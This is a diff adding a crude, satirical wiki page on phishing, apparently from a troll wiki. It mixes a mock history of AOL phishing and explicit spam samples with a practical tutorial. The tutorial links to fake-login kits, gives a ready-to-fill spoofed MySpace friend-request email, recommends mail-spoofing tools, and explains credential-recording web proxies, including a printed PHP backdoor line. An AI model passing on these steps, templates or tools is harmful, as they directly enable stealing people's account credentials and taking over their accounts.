@@ -1,0 +1,191 @@
+Phishing
+[[Image:Heringsschwarm.gif|thumb|Phishes like to stay together and [[sheep|follow the examples of each other]].]]
+'''Phishing''' started as a way h4x0rs too young to have jobs stayed on [[AOL]] for free after AOL decided to test credit card numbers to see if they're fake so they could exchange [[warez]].  AOL users gave out their passwords despite the huge warning on their screen that said, "Remember AOL staff will never ask for your password or billing information."
+
+People used AOHack programs, like [[AOHell]] to phish and transfer warez.  They also used them to get links to download beta versions of new AOL software, where these people would complain that the new AOL software ran horribly on their older hardware (remember these people couldn't afford to pay for internet access).
+
+Eventually AOL cracked down and phishing moved to AOL Instant Messenger.  Phishing on AOL eventually died out when AOL raided all the warez rooms in 1997 in a raid almost as powerful of the one on [[Habbo Hotel]].  They also sent a operative called TOSAdvisor around that just randomly hit rooms where people programmed in visual basic and terminated accounts.  TOSAdvisor also would set up Q&A sections in chat rooms and the hax0rs would go there and try to interview him on abuses about AOL--but this resulted in a terminated account.  AOL users, of course, would call AOL and reactivate their account, but ''keep the same password'' so the hax0r could use it again the next week.  Using phishes also had the disadvantage that if your phish was online you couldn't be online, and if your phish tried to logon when you were online, you were busted so the best phishes rarely used AOL.
+
+Eventually people who knew the internet was serious business learned of it and used phishing to make actual money.  Now phishing is a technique used by [[haxxor]]z to gain credit card details from gullible [[n00bs]]. Most phishing attempts are sent via email. Since phishers are [[419 Nigerian Email Scams|criminal masterminds who use sophisticated scams]], only the most clever avoid their clutches by deleting their [[spam]], instead of answering it.
+
+==Examples==
+[[Image:MySpace Phishing.gif|thumb|right|250px|Phishing on [[MySpace]].]]
+*Hello. I am the widowed orphan of George Simpson, deceased ruler of the known universe. I have twelve billion dollars in illegally obtained latinum from his plundering. I have heard you are a good and honest person. Please send me your bank account number and I will give you 3000% of the money because I really like you.
+*Greetings. I am Jesus and you know you love me. Please send me your bank account number so I can deposit your heavenly reward now, while you can still spend it at Sears.
+* Hi there! A mutual friend told me you are interested in fun and games. I am a sexy coed who enjoys pole dancing, casual relationships, and giving blow jobs. Send me your bank account number so I know I can trust you and I will meet you at Harry's Sex Club this Friday! See ya' there, big boy!
+*Let me tell you something that is on most girls minds but they won't tell you that size maters or will they?
+I am telling you this because it is the honest truth, look I should know, they say that it is all in the way you use it, not how big it is, well I got news for you all, that is pure lies.
+I know from personal experience, I will tell you about a secret that shaun has made me promise to never ever tell anyone, but since he has not called me in three weeks after standing me up, I am going to break the promise and tell you how he went from having a tiny wang and in 4 months he is now about nine inches and get this, it is still getting bigger. He has been secretly taking grow pills from this site, copy and paste the address into your browser to see them. JSWALK.COM
+I found out when I was at his house, three fridays ago, we were getting ready to go to the mall, so while he was in the shower, I went in his room, sneeked under his bed and found a box with pill bottles in it, there was like 9 full bottles and 4 empty ones, all ordered from JSWALK.COM I was laughing at first but then when he came in the room and caught me looking at them, he freaked out and made me sware to not ever tell anyone about them, especially girls from school or work that he has been dating for the past while, now that I think of it, he has been rather busy with all the popular girls around here, when just last year he was the shyest when it came to girls.
+I just never put two and two together until he explained it all to me, I did see his prick and yes, it is huge, pronostar huge, the thickest and longest one I ever seen.
+I know this sounds really shallow, but I am considering ordering 6 bottles from the website at JSWALK.COM for you know who.. he does not have a myspace account, so he is not gonna see this. They guarentee that the pills will work on any man, or they give you your money back, living proof that they do work on any guy, seeing is believing.
+Also 72'000 [[MySpace]] were obtained by phishing:)
+
+<center>''A [[hax0r]] explaining social engineering:''</center>
+<center><youtube>0HHEw9p-vbs</youtube></center>
+
+==Gallery==
+<center><gallery>
+Image:Phishin.jpg|A typical phisher.
+Image:Trout.gif|
+Image:Carp.jpg|
+Image:Eric Carp snoek.jpg|
+</gallery></center>
+
+==Tutorial==
+
+{{FactAlert|This is serious shit and has been known to cause drama and IRL [[Banhammer|Ban Hammers]]. Actually doing this might get you [[Partyvan|v&]]. The information on page is provided for educational purposes only.}}
+
+Phishing is the process of gaining access to an account through a fake login page; any information put in (i.e. username/password) is sent to the phisher.
+
+===Steps===
+#Download <strike>[http://anonym.to/?http://depositfiles.com/files/n4syuwt13 this].</strike> Link down, by your [[Spiderman|friendly neighborhood]] Depositfiles!
+#Extract files of chosen login, and rename the appropriate file to 'index.html' if needed (e.g. gmail.html --> index.html).
+#Upload files of chosen login to a free hosting site, e.g. [http://anonym.to/http://www.zymic.com/ zymic], [http://anonym.to/http://www.110mb.com/ 110mb], or [http://anonym.to/http://x10hosting.com/ x10]. The URL you have chosen will be the URL of the fake login page.
+#Trick the victim into signing on to the login page. Phished usernames/passwords will appear in a text file on the server.
+#????
+#PROFIT
+
+===Tricking the Victim===
+If you know the victim personally, it may be possible to manipulate their trust through [[Social Engineering|social engineering]]. Another popular strategy is to replicate the automated emails companies send out requiring the user to sign in at the specified link. For example, a [[YouTube]] email would look something like:
+
+
+''Dr X has invited you to become friends on YouTube. Becoming friends makes it easier to keep track of what your friends are favoriting, uploading, or rating, and makes it easier to share public or private videos.'' 
+
+''You can accept or reject this invitation by visiting your inbox.''
+
+The word "inbox" is a clickable link, so a phisher could change this link to take the victim to their fake login page instead. Of course, this requires spoofing the sender address, which can be done with things like [[Sparky's Mailbomber]].
+
+===MySpace Phishing===
+
+====Things to Watch Out For====
+
+Myspace replaces any links you enter into their text fields with a redirect through msplinks.com. This is nothing new, but apparently after only taking them an entire year they figured out how to tell if the link goes off-site. Any off-site links will be met with this before redirecting.
+
+====Methods====
+=====Fake Login Page Kits=====
+
+You can completely fake a login website, in that your page will look like a normal MySpace login page (except for the URL in the browser's address bar, but most people don't pay attention to that, which is why this method works), but will send the login and password entered to log file on your site!
+=====Kit 1=====
+
+The first step of MySpace phishing using this method, is to make a fake login page. The code can be found [http://anonym.to/http://www.hackforums.net/showthread.php?tid=16121 here]. What you need to do is sign up at a free hosting site that doesn't have ads and supports PHP. You can find a list of these at the [[web hosts]] article.
+
+After you sign up, you need to download all the files from here and upload to the host. Note that you MAY need to chmod the files to 0777!
+
+=====Kit 2=====
+
+Posted many moons ago in /i/, updated with newer way to get around MySpace security. This allows anybody with 15 minutes spare to set up and maintain their own MySpace phishing site.
+
+Download: [http://anonym.to/http://www.mediafire.com/?sharekey=aa4708b368022712c79b87b207592a1ce04e75f6e8ebb871 Mediafire], [http://anonym.to/http://rapidshare.com/files/52991443/myspace_2007-2.zip.html Rapidshare], [http://anonym.to/http://www.megaupload.com/?d=LPDZYFMO Megaupload]
+Mediafire + Megaupload links have been re-upped.
+
+====Traditional Email Phishing====
+
+Tricking people into visiting fake logins. Set up a fake website, then link them to the site with the method below.
+
+=====Making the email=====
+
+Next, you need to send an email to people, getting them to click the link.
+
+  Hi (your name),
+  
+  (someone) would like to be added to your MySpace friends list.
+  
+  By accepting (someone) as your friend, you will be able to send (someone) personal messages, (someone)'s photos and journals, and you will be able to interact with each other's friends and network!
+
+  Click the following link to view (someone)'s profile and accept or reject this user as your friend: <a href='linkgoeshere'>http://anonym.to/http://www1.myspace.com/reloc.cfm?c=1&id=(8 random letters/numbers)-(4 random letters/numbers)-(4 random letters/numbers)-(4 random letters/numbers)-(12 random letters/numbers)</a>
+
+
+
+  At MySpace we care about your privacy. We have sent you this notification to facilitate your use as a member of the MySpace.com service. If you don't want to receive emails like this to your external email account in the future, change your Account Settings to "Do not send me notification emails"
+
+  Click here to change your Account Settings: <a href='linkgoeshere'>http://anonym.to/http://www.myspace.com/reloc.cfm?c=11</a>
+
+
+  You can also contact us with any questions or concerns regarding your privacy at: mailto:privacy@myspace.com
+
+  MySpace.com 1223 Wilshire Blvd. 402, Santa Monica, CA 90403-5400 USA
+
+  2003-2006 MySpace.com. All Rights Reserved.
+
+Fill in the areas in () and then take that and then replace the linkgoeshere with the path of login.html that you uploaded.
+
+This needs to be sent as html mail.
+
+Now, the very last step is to spoof the from address. You can send it by signing up like somehotchick-myspace@yahoo.com, but it is not very convincing. The next section describes how to spoof mail.
+
+====Spoofing From Address====
+
+Try using something like [http://anonym.to/http://pythoncode.awardspace.com/ pySpoof].
+
+[[PHP_Tutorial#Email_flooder_in_PHP|This email flooder can also be configured to spoof.]]
+
+===Proxy Tunnel Recording - Zelune Proxy===
+
+'''LogProxy''' is a new method of Phishing, and it works by putting out a full functional web proxy, that happens to record authentication information.
+====Technical Details====
+Some information on what the script does.
+=====Browsing=====
+The script browses basically the same as a regular [http://anonym.to/http://zelune.com/ Zelune] [[proxy]], except it records MySpace authentication information. It also handles JavaScript, SSL, and POST/GET data.
+=====Recording=====
+LogProxy works through a mod on line 77-126 of index.php. When it handles POST data, instead of simply looping through the post data to transfer it to a new array, it checks to see if an email key of post data is found, if it is, then it notes that auth data is present, and then acts upon it when the loop is finished. When the loop finishes, it sees that the auth data is present, and then records the user name and password to a text file.
+=====Tracker=====
+To make sure no selfish asshole makes the script their own personal thing, LogProxy was made to tell a tracker where all the LogProxy scripts are. This lets anon post Xbox hueg proxy lists.
+====Instructions====
+=====Setting Up a Web Host=====
+Try and find a free host only that works (and won't take down your site for the high server load), or set it up on your own computer. Note that you need PHP and cUrl to work.<br>
+
+''A list of hosts that support PHP is available at web hosts''
+
+=====Putting up Files=====
+You can find the package <s>[http://anonym.to/http://raid.partyvan.info/store/tools/zelune/logproxy.tar.gz here]</s>. Download it, extract it, then upload the files to your web host. Further instructions found in howto.txt
+
+=====Finishing Up=====
+Open the proxy in your browser, and go to myspace.com. Make up a fake user name and password to enter, so that the tracker is informed of its existence.
+
+===AnonProxy===
+AnonProxy is a modification to the popular web-based proxy script "PHProxy." The modifications allow the one hosting the proxy to record any data sent through it, as determined by a customizable list of keywords. Whenever data is sent through the proxy, the list of keywords (such as "password" or "login") is looked for. If they're found, the current batch of data is written to the log file. The "Keywords" are really regular expressions, so complex rules for recording data can be created.
+
+As of version 1.5, you can specify a list of URLS that AnonProxy should redirect to somewhere else. AnonProxy will proxy the alternate page, instead of the requested page, but display it as the requested page.
+
+Customizable features of AnonProxy include:
+* List of keywords (regular expressions) that will trigger a recording.
+* List of keywords (regular expressions) that don't count, even if they're on the first list.
+* List of urls (regular expressions or not, your choice) for which AnonProxy will use a different page of your choosing as the source.
+* Logfile name
+* Proxy title
+* Proxy "script version"
+
+Installation is as simple as uploading the three files to a web host that supports PHP.
+
+====Warning====
+Whoever created this script put a backdoor in it whereby the logfile name will be revealed (in base64-encoded form) if you specify the GET options 'kjfb' and 'allahuallahackbar'.
+Variants on this:
+ <nowiki>http://<proxy_url>?kjfb=anything&allahuallahackbar=anything</nowiki>
+This is implemented in line 799 of index.php:
+ if(isset($_GET["kjfb"]) && isset($_GET["allahuallahackbar"])) {echo base64_encode($_config["logfile"])."\r\n";}
+
+TL;DR delete or comment out the line above (should be on line 799).
+
+[http://anonym.to/http://rapidshare.com/files/96635963/AnonProxy1.5.rar AnonProxy 1.5]
+
+[http://anonym.to/http://www.filedropper.com/anonproxy15 AnonProxy 1.5]
+
+==See Also==
+*[[Skiddie]]
+*[[Nigerian Scam Email]]
+
+==External Links==
+*[http://partyvan.info/wiki/Myspace_Phishing pages] that this was [http://partyvan.info/wiki/LogProxy copied] from
+*[http://en.wikipedia.org/wiki/Phishing#endnote_Ollman First recorded mention of phishing was 1996], but it's been going on since years earlier when AOL began.  1996 is when AOL actually noticed phishing.
+*[http://wired-vig.wired.com/news/technology/0,1282,9932,00.html Story about fun on AOL back in the day]
+*[http://www.rajuabju.com/warezirc/historyofaolwarez.htm A partial history of the AOL warez scene]
+*[http://en.wikipedia.org/wiki/Phishing#endnote_aolcracks Wikipedia phishing article]
+*<s>[http://en.wikipedia.org/wiki/AOHack_Programs Wikipedia AOHack programs article]</s> BALEETED!
+*[http://www.angelfire.com/ny/macrokilla/proggies.html File archive of AOL Proggies]
+*[http://www.bantown.org Phishing] for the [[Habbo]] [[Raid]]. Hur hur hur.
+
+{{trolls}}
+[[Category:Softwarez]]
+[[Category: Netspeak]]
+[[Category: Drama-generating techniques]]
